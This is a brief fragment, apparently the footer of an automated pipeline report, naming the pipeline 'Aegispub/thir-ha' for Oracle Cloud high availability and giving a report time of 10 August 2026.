_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-08-10T19:03:58Z_
